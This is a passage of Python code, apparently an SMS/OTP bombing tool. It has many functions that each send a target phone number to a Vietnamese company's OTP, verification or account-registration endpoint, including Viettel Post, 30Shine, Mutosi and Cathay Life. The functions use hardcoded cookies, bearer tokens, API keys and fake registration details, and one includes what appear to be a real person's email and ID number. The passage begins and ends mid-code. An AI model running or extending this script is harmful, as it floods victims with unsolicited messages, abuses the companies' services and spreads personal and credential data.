    'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def fu(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://futabus.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://futabus.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjU2OTFhMTk1YjI0MjVlMmFlZDYwNjMzZDdjYjE5MDU0MTU2Yjk3N2QiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMDYyMDYyMywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIwNjIwNjIzLCJleHAiOjE3MjA2MjQyMjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.YR8S04KR7mVRqL68o-a-6svQibV5Gpx8ciD-oxmm3zYMYN55FIAzZPkaZ2rlFaNpGwGl5AkuTWgoVVTU5uTttWOADhoWhOMdICkz811oPzQcjVA0VVG2r7Vg6vVOuKdg3jbD6SJ0ySj6Ln96nI-kcy6Q_169sGYxKIGwknsfM91-NnFRi_D_xNulys0i4OxqRdHxpK42VRkzyl0hwj0sS-cd5i84MT8MtiyOZRhn9J89tMLkHVP5NAyDfHtjm3UYmJYbBRQQf-iaT2nu36AZ_dNRT6rtQuqNpk0vyCIEdPo-9t6cKhaW-I69DBcz5d73fleRTM3zHD-5DlJkpkcWKA',
    'x-app-id': 'client',
}

    json_data = {
    'phoneNumber': phone,
    'deviceId': 'e3025fb7-5436-4002-9950-e6564b3656a6',
    'use_for': 'LOGIN',
}

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
def beau(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '584294d68530c7b753d7f5a77c1ddbc2',
    'origin': 'https://beautybox.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://beautybox.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624059192',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def hoanvu(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '028601f79dcc724ef8b8e7c989c5f649',
    'origin': 'https://reebok.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://reebok.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624197351',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def tokyo(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://tokyolife.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://tokyolife.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'signature': 'c1336d4c72c0b857cdd6aab4de261aa3',
    'timestamp': '1720624468348',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'name': 'khải nguyễn',
    'password': 'vjyy1234',
    'email': 'trongkhai1118@gmail.com',
    'birthday': '2002-07-10',
    'gender': 'female',
}

    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
def cir(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://circa.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://circa.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': {
        'country_code': '84',
        'phone_number': phone,
    },
}

    response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
def guma(phone):
    headers = {
    'Accept': 'application/json',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://gumac.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://gumac.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
}

    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
def hoang(phone):
    cookies = {
    'PHPSESSID': '023c4d0e7b15edc71f14f346ff4ef829',
    'form_key': 'KELcFD4RySb6WQsc',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'form_key': 'KELcFD4RySb6WQsc',
    '_fbp': 'fb.1.1720626061882.764993913589523922',
    '_pk_ses.564990520.6493': '*',
    '_gcl_gs': '2.1.k1$i1720626054',
    '_gcl_au': '1.1.676093199.1720626062',
    'au_id': '1550063352',
    '_ac_au_gt': '1720626058223',
    '_ga': 'GA1.1.42709150.1720626062',
    '_gcl_aw': 'GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE',
    'cdp_session': '1',
    '_asm_visitor_type': 'r',
    'mst-cache-warmer-track': '1720626075588',
    '_asm_ss_view': '%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D',
    '_ga_48P0WR3P2C': 'GS1.1.1720626062.1.1.1720626086.36.0.0',
    'private_content_version': '5e3e65678616f3e49864dce16d1f43de',
    'section_data_ids': '{}',
    '_pk_id.564990520.6493': '1550063352.1720626062.1.1720626136.1720626062.',
    '_ac_client_id': '1550063352.1720626132',
    '_ac_an_session': 'zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624',
    'cdp_blocked_sid_17509314': 'true',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=023c4d0e7b15edc71f14f346ff4ef829; form_key=KELcFD4RySb6WQsc; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=KELcFD4RySb6WQsc; _fbp=fb.1.1720626061882.764993913589523922; _pk_ses.564990520.6493=*; _gcl_gs=2.1.k1$i1720626054; _gcl_au=1.1.676093199.1720626062; au_id=1550063352; _ac_au_gt=1720626058223; _ga=GA1.1.42709150.1720626062; _gcl_aw=GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE; cdp_session=1; _asm_visitor_type=r; mst-cache-warmer-track=1720626075588; _asm_ss_view=%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D; _ga_48P0WR3P2C=GS1.1.1720626062.1.1.1720626086.36.0.0; private_content_version=5e3e65678616f3e49864dce16d1f43de; section_data_ids={}; _pk_id.564990520.6493=1550063352.1720626062.1.1720626136.1720626062.; _ac_client_id=1550063352.1720626132; _ac_an_session=zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624; cdp_blocked_sid_17509314=true',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6ImQ0YmU4OTUwMTY5YzFjM2IiLCJ0ciI6ImMzNzBjYzJiZTc1ZmQ0OGJmZTJjNDQ4YmM1MWIwMzI2IiwidGkiOjE3MjA2MjYyNzE1NTIsInRrIjoiMTMyMjg0MCJ9fQ==',
    'origin': 'https://hoang-phuc.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://hoang-phuc.com/customer/account/create/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-c370cc2be75fd48bfe2c448bc51b0326-d4be8950169c1c3b-01',
    'tracestate': '1322840@nr=0-1-4173019-1120237972-d4be8950169c1c3b----1720626271552',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'action_type': '1',
    'tel': phone,
}

    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
def fm(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://fm.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fm.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
    'x-emp': '',
    'x-fromweb': 'true',
    'x-requestid': '9a563626-1886-40ce-a5b2-99971fd53161',
}

    json_data = {
    'Phone': phone,
    'LatOfMap': '106',
    'LongOfMap': '108',
    'Browser': '',
}

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
def vtpost(phone):
    cookies = {
    '_gid': 'GA1.2.620335128.1720627303',
    '_gat_gtag_UA_128396571_2': '1',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY',
    '_ga_9NGCREH08E': 'GS1.1.1720627303.1.0.1720627304.59.0.0',
    '_gat_gtag_UA_146347905_1': '1',
    '_gat_gtag_UA_142538724_1': '1',
    '_ga_7RZCEBC0S6': 'GS1.1.1720627304.1.1.1720627306.0.0.0',
    '_ga_WN26X24M50': 'GS1.1.1720627305.1.1.1720627306.0.0.0',
    '_ga': 'GA1.1.278441667.1720627303',
    '_ga_P86KBF64TN': 'GS1.1.1720627305.1.1.1720627319.0.0.0',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0',
    'Origin': 'null',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'FormRegister.FullName': 'Taylor Jasmine',
    'FormRegister.Phone': phone,
    'FormRegister.Password': 'vjyy1234',
    'FormRegister.ConfirmPassword': 'vjyy1234',
    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
    'ConfirmOtpType': 'Register',
    'FormRegister.IsRegisterFromPhone': 'true',
    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ',
}

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
def shine(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://30shine.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://30shine.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
}

    response = requests.post(
    'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
    headers=headers,
    json=json_data,
)
def dkimu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'name': 'hà khải',
    'phone': phone,
    'password': 'Vjyy1234@',
    'confirm_password': 'Vjyy1234@',
    'firstname': None,
    'lastname': None,
    'verify_otp': 0,
    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'email': 'dđ@gmail.com',
    'birthday': '2006-02-13',
    'accept_the_terms': 1,
    'receive_promotion': 1,
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data)
def otpmu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
    'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
    'source': 'web_consumers',
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
def cathay(phone):
    cookies = {
    'JSESSIONID': 'u2hdrUGJED2stIM8swVv869b.06283f0e-f7d1-36ef-bc27-6779aba32e74',
    'TS01f67c5d': '0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598',
    'BIGipServerB2C_http': '!zsGhGGj3s8sTbk4R4wuMnLjIghcvhuqi/7WpJSvUzgE9Sc3xf70c/K1xMYAaa5MS3Ic/svEyImCoUg==',
    'TS0173f952': '0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598',
    '_ga': 'GA1.3.1657492692.1720889869',
    '_gid': 'GA1.3.636332226.1720889871',
    'INITSESSIONID': '3f1d8cc9b54babdfc46573d45f59224f',
    '_ga_M0ZP5CJBQZ': 'GS1.1.1720889868.1.0.1720889887.0.0.0',
}

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'JSESSIONID=u2hdrUGJED2stIM8swVv869b.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598; BIGipServerB2C_http=!zsGhGGj3s8sTbk4R4wuMnLjIghcvhuqi/7WpJSvUzgE9Sc3xf70c/K1xMYAaa5MS3Ic/svEyImCoUg==; TS0173f952=0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598; _ga=GA1.3.1657492692.1720889869; _gid=GA1.3.636332226.1720889871; INITSESSIONID=3f1d8cc9b54babdfc46573d45f59224f; _ga_M0ZP5CJBQZ=GS1.1.1720889868.1.0.1720889887.0.0.0',
    'Origin': 'https://www.cathaylife.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'memberMap': '{"userName":"trongkhai611@gmail.com","password":"ditmetzk","birthday":"19/07/1988","certificateNumber":"001088647384","phone":"' + phone + '","email":"trongkhai611@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"NGUYỄN HUY HOÀNG"}',
    'OTP_TYPE': 'P',
    'LANGS': 'vi_VN',
}


    response = requests.post(
    'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
    cookies=cookies,
    headers=headers,
    data=data,
)
def vina(phone):
    cookies = {
    '_gcl_au': '1.1.998139933.1720624574',
    '_ga': 'GA1.1.50287730.1720624578',
    '_fbp': 'fb.2.1720624579398.521085014509551541',
    '_tt_enable_cookie': '1',
    '_ttp': 'KSqjH4dgnlCZCXFrW8iH9-PBbVv',
    '_gcl_gs': '2.1.k1$i1720624593',
    '_gcl_aw': 'GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE',
    '_hjSessionUser_2067180': 'eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==',
    'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa',
    '_hjSession_2067180': 'eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
    '_clck': '1sxln5m%7C2%7Cfni%7C0%7C1652',
    '__cf_bm': 'lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA',
    'builderSessionId': '7b564e5635c64aa4b60d611b650e05b4',
    'sca_fg_codes': '[]',
    'avadaIsLogin': '',
